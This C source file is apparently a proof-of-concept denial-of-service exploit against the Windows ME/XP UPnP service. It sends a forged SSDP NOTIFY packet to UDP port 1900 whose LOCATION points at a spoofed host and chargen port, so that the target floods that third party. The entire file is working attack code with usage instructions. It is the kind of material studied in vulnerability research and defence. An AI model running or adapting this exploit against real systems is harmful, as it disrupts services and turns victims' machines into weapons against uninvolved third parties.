/* 
 * WinME/XP UPNP D0S  
 *
 * ./upnp_udp <remote_hostname> <spooffed_host> <chargen_port>
 *
 * Authors:     Gabriel Maggiotti, 
 * Email:       gmaggiotti@gmail.com
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>
#include <fcntl.h>

#define MAX	1000
#define PORT	1900


char *str_replace(char *rep, char *orig, char *string)
{
int len=strlen(orig);
char buf[MAX]="";
char *pt=strstr(string,orig);

strncpy(buf,string, pt-string );
strcat(buf,rep);
strcat(buf,pt+strlen(orig));
strcpy(string,buf);
return string;
}

/***************************************************************************/

int main(int argc,char *argv[])
{
	int sockfd,i;
	int numbytes;
	int num_socks;
	int addr_len;
	char recive_buffer[MAX]="";

	char send_buffer[MAX]=
	"NOTIFY * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
	"CACHE-CONTROL: max-age=1\r\nLOCATION: http://www.host.com:port/\r\n"
	"NT: urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n"
	"NTS: ssdp:alive\r\nSERVER: QB0X/201 UPnP/1.0 prouct/1.1\r\n"
	"USN: uuid:QB0X\r\n\r\n\r\n";

	char *aux=send_buffer;
	struct hostent *he;
	struct sockaddr_in their_addr;

	if(argc!=4)
	{
		fprintf(stderr,"usage:%s <remote_hostname> "\
			"<spooffed_host> <chargen_port>\n",argv[0]);
		exit(1);
	}


	aux=str_replace(argv[2],"www.host.com",send_buffer);
	aux=str_replace(argv[3],"port",send_buffer);

	if((he=gethostbyname(argv[1]))==NULL)
	{
		perror("gethostbyname");
		exit(1);
	}


	if( (sockfd=socket(AF_INET,SOCK_DGRAM,0)) == -1) {
		perror("socket"); exit(1);
	}

	their_addr.sin_family=AF_INET;
	their_addr.sin_port=htons(PORT);
	their_addr.sin_addr=*((struct in_addr*)he->h_addr);
	bzero(&(their_addr.sin_zero),8);

	if( (numbytes=sendto(sockfd,send_buffer,strlen(send_buffer),0,\
	(struct sockaddr *)&their_addr, sizeof(struct sockaddr))) ==-1)
	{
		perror("send");
		exit(0);
	}
	close(sockfd);

return 0;
}


